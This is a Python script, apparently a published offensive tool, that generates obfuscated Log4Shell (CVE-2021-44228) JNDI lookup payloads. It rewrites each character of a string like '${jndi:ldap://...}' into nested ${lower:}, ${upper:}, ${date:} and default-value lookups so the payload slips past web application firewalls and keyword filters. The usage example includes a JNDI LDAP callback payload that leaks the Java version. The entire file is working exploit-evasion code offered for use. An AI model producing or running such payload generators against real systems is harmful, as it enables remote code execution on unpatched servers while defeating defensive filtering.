'''
Descripttion: 
Author: Zhu013
Date: 2021-12-14 12:43:12
'''
import random
import re


banner = r'''
.__                   _____     __     ___.                                      
|  |   ____   ____   /  |  |   |__|    \_ |__ ___.__.___________    ______ ______
|  |  /  _ \ / ___\ /   |  |_  |  |     | __ <   |  |\____ \__  \  /  ___//  ___/
|  |_(  <_> ) /_/  >    ^   /  |  |     | \_\ \___  ||  |_> > __ \_\___ \ \___ \ 
|____/\____/\___  /\____   /\__|  |_____|___  / ____||   __(____  /____  >____  >
           /_____/      |__\______/_____/   \/\/     |__|       \/     \/     \/ 
Author:D2LAB-Zhu013
Introduction: log4j payload bypass   
Useage:
	python version 3.8
	python log4j_bypass.py payload
Example：
	python log4j_bypass.py '${jndi:ldap://127.0.0.1:1389/${sys:java.version}}' 
'''
def get_randomstr():
    str1 = 'test:by:d2lab'
    return str1

def mix(i,n):
    # print(n)
    m = random.choice(n)
    if m == 'n1':
        i = '${'+get_randomstr()+':-'+i+'}'
    if m =='n2':
        i = '${lower:'+i+'}'
    if m =='n3':
        i = '${upper:'+i+'}'
    if m =='n4':
        i = '${date:\''+i+'\'}'
    return i

def get_random(n):
    n = random.randint(1,n-1)
    return n

def regex_str(regex,destr):
	match = re.findall(regex,str(destr))
	try:
		restr = match[0]
	except Exception as e :
		print(e)
		restr = match[0]

	return restr

def log4j_bypass(payload):
    if payload == '':
        print("请输入需要混淆的payload")
    try:
        print(payload)
        bypass_payload = ''
        str1= regex_str(r'(\$\{.*?\:)',payload)
        print('str1:'+str1)
        for i in str1:
            n=['n1','n2','n3','n4']
            # :- lower upper date
            if i not in ['$','{','}']:
                i = mix(i,n)
            bypass_payload = bypass_payload+i
        str2= regex_str(r'\$\{.*?:(.*?:\/\/)',payload)
        print('str2:'+str2)
        for i in str2:
            n=['n1','n2','n4']
            # :- lower date
            i = mix(i,n)
            bypass_payload = bypass_payload+i
        str3= regex_str(r'\/\/(.*})',payload)
        print('str3:'+str3)
        for i in str3:
            n=['n1','n2']
            # :- lower upper
            if i not in ['/','$','{','}']:
                i = mix(i,n)
            bypass_payload = bypass_payload+i
        print('=========================== payload generator ==============================')
        print(bypass_payload)
        # l = len(payload)
    except Exception as e:
        print(e)

if __name__ == '__main__':
    print(banner)
    payload=''
    import sys
    print(sys.argv)
    if len(sys.argv) ==2:
        payload = sys.argv[1]
    print("payload:"+payload)
    log4j_bypass(payload)
